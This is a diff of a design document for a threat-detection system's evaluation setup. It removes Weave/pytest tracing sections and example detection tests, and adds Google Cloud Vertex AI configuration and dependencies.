-        c2_detector=None,
-        force_traced=marked,
-    )
-```
-
-**Design invariants enforced by this pattern**:
-- `_weave_available()` and `should_enable_weave()` share the same priority logic (WEAVE_DISABLED → WEAVE_OFFLINE → WANDB_API_KEY → credentials); `_weave_available()` additionally checks package importability at the collection stage.
-- `@pytest.mark.weave` tests are **never silently executed without tracing** — they are either fully traced or cleanly skipped.
-- Tests without the marker receive bare components regardless of any environment variable; Weave has zero overhead for the rest of the test suite.
-- The `detector_suite` fixture uses `request.node.get_closest_marker()` — pytest's stable public API. There is no private-API marker detection anywhere in the production codebase.
-
-#### Evaluation Test Structure
-
-```python
-# tests/evals/test_atd_weave_evaluations.py
-import pytest
-import weave
-from blackwall.enterprise.advanced_threat_detection.weave_harness import (
-    WeaveEvaluationHarness,
-    WeaveConfig
-)
-
-@pytest.fixture
-def weave_harness():
-    config = WeaveConfig(
-        project_name="blackwall-atd",
-        offline_mode=os.getenv("WEAVE_OFFLINE") == "true",
-        parallelism=int(os.getenv("WEAVE_PARALLELISM", "1"))
-    )
-    return WeaveEvaluationHarness(config)
-
-@pytest.mark.asyncio
-@pytest.mark.weave
-async def test_eval_multi_stage_attack_detection(weave_harness):
-    """Evaluate multi-stage attack path detection with Weave tracking"""
-    scenario = load_scenario("multi_stage_attack.yaml")
-
-    result = await weave_harness.run_evaluation(
-        scenario_name="multi_stage_attack",
-        events=scenario["events"],
-        expected_detections=scenario["expected_detections"]
-    )
-
-    assert result["attack_path"]["detected"] == True
-    assert result["metrics"]["precision"] >= 0.95
-    assert result["metrics"]["recall"] >= 0.90
-
-@pytest.mark.asyncio
-@pytest.mark.weave
-async def test_eval_agent_swarm_detection(weave_harness):
-    """Evaluate agent swarm detection with Weave tracking"""
-    scenario = load_scenario("agent_swarm.yaml")
-
-    result = await weave_harness.run_evaluation(
-        scenario_name="agent_swarm",
-        events=scenario["events"],
-        expected_detections=scenario["expected_detections"]
-    )
-
-    assert result["swarm"]["detected"] == True
-    assert result["metrics"]["false_positive_rate"] <= 0.05
-```
-
-### Backward Compatibility
-
-The Weave integration maintains full backward compatibility with the existing pytest-based evaluation infrastructure:
-
-1. **Optional Weave Activation**: Weave tracing is activated only when `should_enable_weave()` returns `True` **and** `force_traced=True` is passed to the factory. The `detector_suite` fixture sets `force_traced` by reading `request.node.get_closest_marker("weave")` — the only public pytest API for this. There is no private-API marker detection inside the factory.
-2. **Single construction gate**: All `WeaveTraced*` wrapper instantiation flows through `build_detector_suite()` in `weave_factory.py`. The factory's decision is `traced = should_enable_weave() and force_traced` — explicit, with no hidden fallback path. Tests use the `detector_suite` fixture; production code calls the factory with `force_traced=False` (default).
-3. **Fallback to Standard Pytest**: Tests without `@pytest.mark.weave` receive bare, undecorated components from `build_detector_suite()` regardless of env vars — zero Weave overhead guaranteed.
-4. **Existing Test Preservation**: All existing unit, integration, and property tests continue to work unchanged because they neither use the `detector_suite` fixture with the marker nor set `force_traced`.
-5. **Progressive Enhancement**: Weave features are additive and don't break existing workflows.
-6. **Collection-Time Skip via `pytest_collection_modifyitems`**: `@pytest.mark.weave` tests are auto-skipped at collection time (before any imports) when `_weave_available()` returns `False`. This prevents `ImportError` from surfacing as test failures and ensures the marker's pyproject.toml description remains accurate. The skip message instructs users to install `pip install -e ".[weave]"` and set `WANDB_API_KEY` or `WEAVE_OFFLINE=true`. Tests marked with `@pytest.mark.weave` are never silently run in a degraded state.
-
-#### Compatibility Implementation
-
-```python
-# Automatic Weave detection and graceful degradation
-def should_enable_weave() -> bool:
-    """Check if Weave should be enabled based on environment.
-
-    Priority order (highest to lowest):
-    1. WEAVE_DISABLED=true  → always off, no tracing whatsoever
-    2. WEAVE_OFFLINE=true   → on, but stores traces locally; no cloud
-                              credentials required
-    3. WANDB_API_KEY set    → on with cloud sync
-    4. netrc / config creds → on with cloud sync
-    5. (none of the above)  → off
-    """
-    if os.getenv("WEAVE_DISABLED") == "true":
-        return False
-    if os.getenv("WEAVE_OFFLINE") == "true":
-        return True   # offline mode: local traces, no credentials needed
-    if os.getenv("WANDB_API_KEY"):
-        return True
-    # Check for netrc or config file credentials
-    return has_wandb_credentials()
-
-# weave_op_if_enabled is kept for standalone function decoration outside
-# of the detector-suite pattern (e.g. WeaveEvaluationHarness methods).
-def weave_op_if_enabled(func):
-    """Apply @weave.op() only if Weave is enabled.
-
-    NOTE: For detector components, prefer build_detector_suite() /
-    the detector_suite fixture rather than this decorator directly,
-    so that pytest marker state is also checked.
-    """
-    if should_enable_weave():
-        return weave.op()(func)
-    return func
+# GCP Authentication & Project (ADC)
+GCP_PROJECT = "your-gcp-project-id"
+GOOGLE_GENAI_USE_VERTEXAI = "true"
+GEMINI_TIER = "paid"
+BLACKWALL_TIER = "paid"
+
+# Evaluation Environment Selection
+BLACKWALL_EVAL_TIER = "tier1"  # "tier1" (ADK Harness) or "tier2" (Cybench gVisor)
+BLACKWALL_EVAL_CONTAINMENT = "strict"  # Suppress production mitigations in eval mode
 ```
 
 ## Dependencies
@@ -2557,20 +1802,16 @@ def weave_op_if_enabled(func):
 - **asyncpg**: PostgreSQL async driver
 - **TimescaleDB**: Time-series optimization for PostgreSQL
 - **Pydantic**: Data validation and settings management
+- **google-genai**: Official Google GenAI SDK for Gemini in Vertex AI mode
+- **google-cloud-aiplatform**: GCP Vertex AI SDK & Gen AI Evaluation Service
+- **opentelemetry-exporter-gcp-trace**: Cloud Trace OpenTelemetry exporter
 - **pytest**: Testing framework
 - **pytest-asyncio**: Async test support
 - **pytest-bdd**: Behavior-driven development tests
 - **Hypothesis**: Property-based testing
 
-### Weave Integration Dependencies
-
-These packages are declared as an optional extras group in `pyproject.toml` (`[project.optional-dependencies] weave`) because Weave is fully optional. Install with `pip install -e ".[weave]"` to enable evaluation tracking; omit the extra for environments where Weave is not needed.
-
-- **weave**: >= 0.50.0 - W&B Weave for evaluation tracking
-- **wandb**: >= 0.16.0 - Weights & Biases SDK for authentication
-- **pyyaml**: >= 6.0 - YAML scenario parsing (already in core dependencies)
-
 ### External Services
-- **Weights & Biases**: Cloud-based evaluation tracking (optional, supports offline mode)
+- **Google Cloud Vertex AI**: Gen AI Evaluation Service and Gemini foundation models
+- **Google Cloud Trace & Logging**: Distributed tracing and audit logging
 - **PostgreSQL with TimescaleDB**: Graph storage and time-series queries
 - **Existing Blackwall Pillars**: Event sources (Kernel, Threat Mesh, Identity, Pipeline, Forensics)
